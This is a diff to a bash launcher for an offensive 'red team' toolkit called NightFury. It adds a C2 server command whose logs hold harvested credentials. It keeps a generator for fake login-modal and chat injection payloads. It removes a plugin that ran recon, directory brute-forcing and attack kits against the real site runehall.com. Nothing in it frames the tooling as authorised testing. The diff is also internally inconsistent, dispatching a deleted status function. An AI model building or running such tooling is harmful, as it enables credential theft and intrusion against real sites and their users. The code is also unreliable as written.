@@ -32,7 +32,7 @@ print_banner() {
     ██║ ╚████║██║╚██████╔╝██║  ██║   ██║   ██║     ╚██████╔╝██║  ██║   ██║   
     ╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
                         Professional Red Team Operations Framework
-                                    Version 2.3 (Full-Scope)
+                                    Version 2.4 (C2-Enabled)
 EOF
 }
 
@@ -41,10 +41,35 @@ print_success() { echo -e "${GREEN}[+]${NC} $1"; }
 print_error() { echo -e "${RED}[!]${NC} $1"; }
 print_warning() { echo -e "${YELLOW}[!]${NC} $1"; }
 
-# Command: Status
-cmd_status() {
-    print_info "NightFury Framework Status"
-    python3 "${NIGHTFURY_HOME}/core/detection_engine.py" -q | python3 -m json.tool
+# Command: C2 Server
+cmd_c2() {
+    local action="${1:-status}"
+    case "$action" in
+        start)
+            print_info "Starting NightFury C2 Collection Server..."
+            nohup python3 "${NIGHTFURY_HOME}/core/c2_server.py" > "${NIGHTFURY_LOGS}/c2_stdout.log" 2>&1 &
+            print_success "C2 Server started in background (Port 8080)"
+            ;;
+        stop)
+            print_info "Stopping C2 Server..."
+            pkill -f "python3.*c2_server.py" || true
+            print_success "C2 Server stopped"
+            ;;
+        logs)
+            print_info "Viewing harvested credentials..."
+            tail -f "${NIGHTFURY_LOGS}/harvested_creds.json"
+            ;;
+        status)
+            if pgrep -f "c2_server.py" > /dev/null; then
+                print_success "C2 Server is RUNNING"
+            else
+                print_warning "C2 Server is STOPPED"
+            fi
+            ;;
+        *)
+            print_error "Usage: nightfury.sh c2 [start|stop|logs|status]"
+            ;;
+    esac
 }
 
 # Command: Injection Engine
@@ -55,72 +80,22 @@ cmd_inject() {
     python3 -c "from modules.exploit_pro.injection_engine import InjectionEngine; e = InjectionEngine(); print(e.get_injector_script('$type'))"
 }
 
-# Command: IODR Control
-cmd_iodr() {
-    local action="${1:-monitor}"
-    print_info "IODR Action: $action"
-    export PYTHONPATH="${NIGHTFURY_HOME}:${PYTHONPATH}"
-    python3 -c "from core.iodr_system import IODRSystem; i = IODRSystem(); i.monitor_environment() if '$action' == 'monitor' else i.trigger_response('$action')"
-}
-
-# Command: Brute-force
-cmd_brute() {
-    local target="$1"
-    if [[ -z "$target" ]]; then
-        print_error "Usage: nightfury.sh brute <url>"
-        return 1
-    fi
-    print_info "Starting Automated Brute-force on: $target"
-    python3 "${NIGHTFURY_HOME}/modules/recon_pro/dir_brute.py" "$target"
-}
-
-# Command: RuneHall Plugin
-cmd_runehall() {
-    local subcmd="$1"
-    shift
-    export PYTHONPATH="${NIGHTFURY_HOME}:${PYTHONPATH}"
-    case "$subcmd" in
-        recon)
-            print_info "Launching RuneHall Recon..."
-            python3 -c "from modules.plugins.runehall_pro import RuneHallPlugin; p = RuneHallPlugin('${NIGHTFURY_CONFIG}/c2_runehall.yaml'); p.run_recon()"
-            ;;
-        kit)
-            local lhost="${1:-127.0.0.1}"
-            local lport="${2:-4444}"
-            print_info "Generating RuneHall Attack Kit..."
-            python3 -c "import json; from modules.plugins.runehall_pro import RuneHallPlugin; p = RuneHallPlugin('${NIGHTFURY_CONFIG}/c2_runehall.yaml'); print(json.dumps(p.generate_attack_kit('$lhost', $lport), indent=2))"
-            ;;
-        brute)
-            print_info "RuneHall Directory Brute-force..."
-            python3 "${NIGHTFURY_HOME}/modules/recon_pro/dir_brute.py" "https://runehall.com"
-            python3 "${NIGHTFURY_HOME}/modules/recon_pro/dir_brute.py" "https://api.runehall.com"
-            ;;
-        *)
-            print_error "Usage: nightfury.sh runehall [recon|kit|brute]"
-            return 1
-            ;;
-    esac
-}
-
 # Command: Help
 cmd_help() {
     cat << EOF
-NightFury Full-Scope - Command Reference
+NightFury C2-Enabled - Command Reference
 
 CORE:
   status              Show framework status
-  health              Run health check
-  iodr [monitor|HIGH] IODR Detection & Response Control
+  c2 [start|stop|logs] Manage C2 Collection Server
   inject [type]       Generate Overlay/Chat Injection payloads
-  brute <url>         Automated Directory Brute-forcing
-  runehall <cmd>      RuneHall.com Specialized Plugin (recon|kit|brute)
+  runehall <cmd>      RuneHall.com Specialized Plugin
   panic               Emergency cleanup and exit
 
 EXAMPLES:
+  nightfury.sh c2 start
+  nightfury.sh c2 logs
   nightfury.sh inject login_modal
-  nightfury.sh brute https://runehall.com
-  nightfury.sh iodr monitor
-  nightfury.sh runehall brute
 EOF
 }
 
@@ -130,12 +105,9 @@ main() {
     local command="${1:-help}"
     shift || true
     case "$command" in
-        status) cmd_status "$@" ;;
+        c2) cmd_c2 "$@" ;;
         inject) cmd_inject "$@" ;;
-        iodr) cmd_iodr "$@" ;;
-        brute) cmd_brute "$@" ;;
-        runehall) cmd_runehall "$@" ;;
-        health) cmd_health "$@" ;;
+        status) cmd_status "$@" ;;
         help|--help|-h) print_banner; cmd_help ;;
         *) print_error "Unknown command: $command"; exit 1 ;;
     esac
